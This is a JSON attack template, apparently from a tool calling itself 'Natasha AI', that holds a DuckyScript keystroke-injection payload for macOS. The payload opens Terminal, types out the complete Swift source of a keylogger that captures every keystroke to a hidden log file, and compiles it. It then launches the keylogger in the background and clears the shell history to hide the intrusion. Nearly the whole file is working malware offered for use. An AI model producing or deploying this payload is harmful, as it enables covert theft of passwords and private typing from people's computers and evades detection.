{
  "metadata": {
    "name": "macOS Keylogger",
    "description": "Deploys a keylogger on macOS systems",
    "version": "1.0",
    "author": "Natasha AI"
  },
  "templates": [
    {
      "name": "Swift Keylogger",
      "description": "Deploys a Swift-based keylogger that saves keystrokes to a file",
      "attack_type": "keylogger",
      "script": [
        "REM macOS Swift Keylogger",
        "REM Generated by Natasha AI",
        "DELAY 1000",
        "GUI SPACE",
        "DELAY 500",
        "STRING terminal",
        "DELAY 500",
        "ENTER",
        "DELAY 1000",
        "STRING mkdir -p ~/Library/Scripts",
        "ENTER",
        "DELAY 300",
        "STRING cat > ~/Library/Scripts/keylogger.swift << 'EOF'",
        "ENTER",
        "STRING import Cocoa",
        "ENTER",
        "STRING",
        "ENTER",
        "STRING let logFile = &quot;~/Library/Logs/keylog.txt&quot;",
        "ENTER",
        "STRING let fileManager = FileManager.default",
        "ENTER",
        "STRING let logPath = NSString(string: logFile).expandingTildeInPath",
        "ENTER",
        "STRING",
        "ENTER",
        "STRING func logKey(_ key: String) {",
        "ENTER",
        "STRING     let timestamp = DateFormatter.localizedString(from: Date(), dateStyle: .medium, timeStyle: .medium)",
        "ENTER",
        "STRING     let logString = &quot;[\\(timestamp)] \\(key)\\n&quot;",
        "ENTER",
        "STRING     if let data = logString.data(using: .utf8) {",
        "ENTER",
        "STRING         if fileManager.fileExists(atPath: logPath) {",
        "ENTER",
        "STRING             if let fileHandle = try? FileHandle(forWritingTo: URL(fileURLWithPath: logPath)) {",
        "ENTER",
        "STRING                 fileHandle.seekToEndOfFile()",
        "ENTER",
        "STRING                 fileHandle.write(data)",
        "ENTER",
        "STRING                 fileHandle.closeFile()",
        "ENTER",
        "STRING             }",
        "ENTER",
        "STRING         } else {",
        "ENTER",
        "STRING             try? data.write(to: URL(fileURLWithPath: logPath), options: .atomic)",
        "ENTER",
        "STRING         }",
        "ENTER",
        "STRING     }",
        "ENTER",
        "STRING }",
        "ENTER",
        "STRING",
        "ENTER",
        "STRING // Start message",
        "ENTER",
        "STRING logKey(&quot;Keylogger started&quot;)",
        "ENTER",
        "STRING",
        "ENTER",
        "STRING // Create event tap to monitor keystrokes",
        "ENTER",
        "STRING let eventMask = CGEventMask(1 << CGEventType.keyDown.rawValue)",
        "ENTER",
        "STRING",
        "ENTER",
        "STRING guard let eventTap = CGEvent.tapCreate(tap: .cgSessionEventTap,",
        "ENTER",
        "STRING                                      place: .headInsertEventTap,",
        "ENTER",
        "STRING                                      options: .defaultTap,",
        "ENTER",
        "STRING                                      eventsOfInterest: eventMask,",
        "ENTER",
        "STRING                                      callback: { (proxy, type, event, refcon) -> Unmanaged<CGEvent>? in",
        "ENTER",
        "STRING     if type == .keyDown {",
        "ENTER",
        "STRING         let keyCode = event.getIntegerValueField(.keyboardEventKeycode)",
        "ENTER",
        "STRING         let flags = event.flags",
        "ENTER",
        "STRING         ",
        "ENTER",
        "STRING         // Get character from key code",
        "ENTER",
        "STRING         var chars: [UniChar] = [0, 0, 0, 0]",
        "ENTER",
        "STRING         var length = 0",
        "ENTER",
        "STRING         let keyboard = TISCopyCurrentKeyboardInputSource().takeRetainedValue()",
        "ENTER",
        "STRING         let layoutData = TISGetInputSourceProperty(keyboard, kTISPropertyUnicodeKeyLayoutData)",
        "ENTER",
        "STRING         ",
        "ENTER",
        "STRING         if let layoutData = layoutData {",
        "ENTER",
        "STRING             let dataRef = Unmanaged<CFData>.fromOpaque(layoutData).takeUnretainedValue() as CFData",
        "ENTER",
        "STRING             let keyLayout = unsafeBitCast(CFDataGetBytePtr(dataRef), to: UnsafePointer<UCKeyboardLayout>.self)",
        "ENTER",
        "STRING             let modifierKeyState = UInt32(flags.rawValue)",
        "ENTER",
        "STRING             let keyTranslateOptions = OptionBits(0)",
        "ENTER",
        "STRING             var deadKeyState: UInt32 = 0",
        "ENTER",
        "STRING             UCKeyTranslate(keyLayout, UInt16(keyCode), UCKeyAction.down, modifierKeyState, UInt32(LMGetKbdType()),",
        "ENTER",
        "STRING                           keyTranslateOptions, &deadKeyState, 4, &length, &chars)",
        "ENTER",
        "STRING         }",
        "ENTER",
        "STRING         ",
        "ENTER",
        "STRING         var keyString = String(utf16CodeUnits: chars, count: Int(length))",
        "ENTER",
        "STRING         ",
        "STRING         // Handle special keys",
        "ENTER",
        "STRING         if keyString.isEmpty {",
        "ENTER",
        "STRING             switch keyCode {",
        "ENTER",
        "STRING             case 36: keyString = &quot;[Return]&quot;",
        "ENTER",
        "STRING             case 49: keyString = &quot;[Space]&quot;",
        "ENTER",
        "STRING             case 51: keyString = &quot;[Delete]&quot;",
        "ENTER",
        "STRING             case 53: keyString = &quot;[Escape]&quot;",
        "ENTER",
        "STRING             case 123: keyString = &quot;[Left]&quot;",
        "ENTER",
        "STRING             case 124: keyString = &quot;[Right]&quot;",
        "ENTER",
        "STRING             case 125: keyString = &quot;[Down]&quot;",
        "ENTER",
        "STRING             case 126: keyString = &quot;[Up]&quot;",
        "ENTER",
        "STRING             default: keyString = &quot;[Key \\(keyCode)]&quot;",
        "ENTER",
        "STRING             }",
        "ENTER",
        "STRING         }",
        "ENTER",
        "STRING         ",
        "ENTER",
        "STRING         logKey(keyString)",
        "ENTER",
        "STRING     }",
        "ENTER",
        "STRING     return Unmanaged.passRetained(event)",
        "ENTER",
        "STRING }, userInfo: nil) else {",
        "ENTER",
        "STRING     logKey(&quot;Failed to create event tap&quot;)",
        "ENTER",
        "STRING     exit(1)",
        "ENTER",
        "STRING }",
        "ENTER",
        "STRING",
        "ENTER",
        "STRING // Create a run loop source and add it to the current run loop",
        "ENTER",
        "STRING let runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0)",
        "ENTER",
        "STRING CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, .commonModes)",
        "ENTER",
        "STRING CGEvent.tapEnable(tap: eventTap, enable: true)",
        "ENTER",
        "STRING",
        "ENTER",
        "STRING // Set a timer to stop after 1 hour",
        "ENTER",
        "STRING let timer = Timer(timeInterval: 3600, repeats: false) { _ in",
        "ENTER",
        "STRING     logKey(&quot;Keylogger stopped&quot;)",
        "ENTER",
        "STRING     exit(0)",
        "ENTER",
        "STRING }",
        "ENTER",
        "STRING",
        "ENTER",
        "STRING RunLoop.current.add(timer, forMode: .common)",
        "ENTER",
        "STRING CFRunLoopRun()",
        "ENTER",
        "STRING EOF",
        "ENTER",
        "DELAY 300",
        "STRING swiftc -o ~/Library/Scripts/keylogger ~/Library/Scripts/keylogger.swift",
        "ENTER",
        "DELAY 3000",
        "STRING nohup ~/Library/Scripts/keylogger > /dev/null 2>&1 &",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;Keylogger started. Logs saved to ~/Library/Logs/keylog.txt&quot;",
        "ENTER",
        "DELAY 300",
        "STRING history -c",
        "ENTER",
        "DELAY 300",
        "STRING exit",
        "ENTER"
      ]
    }
  ]
}